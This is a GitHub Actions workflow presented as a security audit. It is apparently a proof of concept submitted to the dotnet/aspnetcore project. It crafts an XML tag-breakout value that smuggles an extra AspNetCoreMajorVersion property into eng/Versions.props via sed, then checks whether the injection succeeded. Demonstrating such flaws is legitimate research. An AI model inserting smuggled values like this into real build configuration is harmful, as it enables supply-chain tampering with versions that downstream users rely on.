# Security Research: Supply Chain Logic Audit
# Project: dotnet/aspnetcore - Indirect Prompt Injection Validation
# Author: HackerMD (Mohamadisha Shaikh)

name: "Security-Audit-Logic-Bypass"

on:
  workflow_dispatch: # Manually triggered for security validation

jobs:
  verify_protection_boundary:
    name: "Audit Boundary Integrity"
    runs-on: ubuntu-latest
    steps:
      - name: "Environment Check & Source Clone"
        uses: actions/checkout@v4

      - name: "Attempt Injection (XML Tag Breakout)"
        id: exploit_phase
        run: |
          # Researcher Note: Emulating a malicious upstream version string 
          # to test if 'Versions.props' handles tag breakouts.
          PAYLOAD_STRING="1.2.3</SeleniumWebDriverVersion><AspNetCoreMajorVersion>999</AspNetCoreMajorVersion>"
          echo "payload=$PAYLOAD_STRING" >> $GITHUB_OUTPUT
          echo "[+] Malicious payload prepared."

      - name: "Trigger Automated Versioning Logic"
        run: |
          TARGET="eng/Versions.props"
          INJECTED_VAL="${{ steps.exploit_phase.outputs.payload }}"
          
          echo "[!] Commencing write-operation on $TARGET..."
          
          # Logic: If 'Versions.props' is not in the whitelist, this sed command 
          # will successfully overwrite unrelated core version properties.
          sed -i "s@<SeleniumWebDriverVersion>.*</SeleniumWebDriverVersion>@<SeleniumWebDriverVersion>$INJECTED_VAL</SeleniumWebDriverVersion>@" "$TARGET"

      - name: "Post-Attack Integrity Audit"
        run: |
          echo "=== SECURITY AUDIT SUMMARY ==="
          # Check for leaked AspNetCoreMajorVersion property
          grep -A 1 "SeleniumWebDriverVersion" eng/Versions.props
          
          # Final validation of the logical bypass
          if grep -q "<AspNetCoreMajorVersion>999</AspNetCoreMajorVersion>" eng/Versions.props; then
             echo "CRITICAL: Security boundary bypassed."
             echo "Result: Injection successful. core framework version hijacked."
          else
             echo "INFO: Injection blocked or sanitized."
             exit 1
          fi
